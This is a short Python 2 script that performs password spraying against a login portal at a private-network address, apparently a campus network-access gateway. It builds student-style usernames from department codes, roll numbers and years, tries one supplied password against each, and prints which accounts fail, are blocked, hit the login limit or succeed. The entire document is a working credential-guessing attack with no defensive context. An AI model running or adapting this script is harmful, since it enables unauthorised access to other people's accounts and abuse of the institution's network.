import sys,urllib,urllib2,time
from xml.dom.minidom import parseString
url='https://172.16.1.1:8090'
password=raw_input()
br=['pe','ap','ee','ese','ec','rs','ph','bt','ac','it','chp','ece','eee','am','cs','cse','me']
for x in range(10000,10101):
    for y in br:
        for z in range(2012,2016):
            a=""
            a="phd"+y+str(x)+str(z)
            data = {"mode":"191","username":a,"password":password}
            content=urllib2.urlopen(url + "/login.xml", urllib.urlencode(data), timeout=3)
            data=content.read()
            simple=parseString(data)
            mtag=simple.getElementsByTagName('message')[0].toxml()
            message=mtag.replace('<message>','').replace('</message','').replace('<message/>','')
            failmssg="<![CDATA[The system could not log you on. Make sure your password is correct]]>>"
            blockmssg="<![CDATA[You are not allowed to login at this time]]>>"
            limitmssg="<![CDATA[You have reached Maximum Login Limit.]]>>"
            successmssg="<![CDATA[You have successfully logged in]]>>"
            if message==failmssg:
                print "{0} - f".format(a)
            elif message==blockmssg:
                print "{0} - blocked".format(a)
            elif message==limitmssg:
                print "{0} - login limit".format(a)
            elif message==successmssg:
                print "{0} - success".format(a)
